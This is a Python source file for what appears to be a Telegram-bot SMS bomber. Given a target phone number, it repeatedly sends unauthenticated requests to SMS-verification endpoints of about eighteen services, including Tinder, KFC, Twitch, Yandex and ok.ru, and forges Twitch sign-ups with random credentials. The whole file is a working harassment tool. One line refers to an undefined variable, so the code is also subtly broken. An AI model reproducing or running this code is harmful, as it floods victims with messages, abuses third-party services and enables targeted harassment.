def spamm(phone, code_country, id, bot):
    import requests
    import random
    import time
    import telebot
    from config import number_of_cycles


    if code_country[0] == '+':
        code_country = code_country[1:]

    phone = code_country + phone[-10:]
    name = ''

    result = False
    for lett in phone:
        if lett not in '1234567890':
            result = True

    if result:
        print('Ошибка')
        return 1

    for x in range(12):
        name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    iteration = 0
    while True:
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', #OK
                          data={'phone_number': phone}, headers={})
        except:
            print('Ошибка 1')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={}) #OK
        except:
            print('Ошибка 2')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={}) #OK
        except:
            print('Ошибка 3')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone}) # OK
        except:
            print('Ошибка 4')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}) # OK
        except:
            print('Ошибка 5')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
        except:
            print('Ошибка 6')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except:
            print('Ошибка 7')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/') #OK
        except:
            print('Ошибка 8')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', #OK
                          data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except:
            print('Ошибка 10')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": phone}) #OK
        except:
            print('Ошибка 11')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone}) #OK
        except:
            print('Ошибка 12')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', #OK
                          json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
        except:
            print('Ошибка 13')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", #OK
                          data={"st.r.phone": "+" + phone})
        except:
            print('Ошибка 14')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': phone})
        except:
            print('Ошибка 15')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', # OK
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": phone, "username": username})
        except:
            print('Ошибка 16')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',#OK
                          json={"phone_number": "+" + phone})
        except:
            print('Ошибка 17')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone}) #OK
        except:
            print('Ошибка 18')

        try:
            iteration += 1
            if iteration >= number_of_cycles:
                bot.send_message(id, 'Спам на номер {} завершен'.format(_phone))
                return
        except:
            break
